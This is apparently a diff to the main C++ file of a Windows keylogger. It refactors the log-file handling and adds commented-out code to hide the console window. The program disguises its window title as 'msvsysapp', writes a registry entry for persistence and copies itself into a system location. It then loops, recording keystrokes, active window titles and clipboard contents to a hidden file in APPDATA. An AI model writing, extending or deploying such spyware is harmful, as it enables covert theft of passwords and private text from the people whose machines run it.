@@ -7,8 +7,14 @@
 #include <ctime>
 #include <string>
 
+const std::string LogPath = getenv("APPDATA") + std::string("\\logs.dat");
+
 int main(int argc, char * argv[])
 {
+	//HWND stealth; // window handler used to hide the outputted console window
+	//AllocConsole();
+	//stealth = FindWindowA("ConsoleWindowClass", NULL);
+	//ShowWindow(stealth, 0);
 	std::fstream logFile, clipFile;
 	KeyLogger k;
 	CClip cp;
@@ -17,23 +23,19 @@ int main(int argc, char * argv[])
 	std::string handle = k.GetWindowTitle();
 	CreateMutex(NULL, TRUE, "8154d1e24f699f5b217f5ebc8c8c823c");
 	if (GetLastError() != ERROR_ALREADY_EXISTS) {
-		SetConsoleTitle("msvsysapp.exe");
-		/*FreeConsole();*/
+		SetConsoleTitle("msvsysapp");
 		Sleep(500);
 		k.AddREG();
 		k.CopyToSys(argv[0]);
 		std::cout << "[  i  ] Starting KeyLogger...	[  i  ]";
-		logFile.open((getenv("APPDATA") + std::string("\\logs.dat")), fstream::app);
+		logFile.open(LogPath.c_str() , fstream::app);
 		logFile << "\n \n   " << date << '\n'
 			<< "APP: " << handle << '\n';
-		logFile.close();
 		while (true) {
 			if (handle != k.GetWindowTitle()) {
-				logFile.open((getenv("APPDATA") + std::string("\\logs.dat")), fstream::app);
-				Sleep(300);
+				Sleep(100);
 				logFile << "\n \nAPP: " << k.GetWindowTitle() << '\n';
 				handle = k.GetWindowTitle();
-				logFile.close();
 			}
 			k.OEMkeys(logFile);
 			k.AZkeys(logFile);
@@ -41,6 +43,7 @@ int main(int argc, char * argv[])
 			k.SpecialKeys(logFile);
 			cp.GetClipboard(clipFile);
 		}
+		logFile.close();
 	}
 	system("pause");
 	return 0;
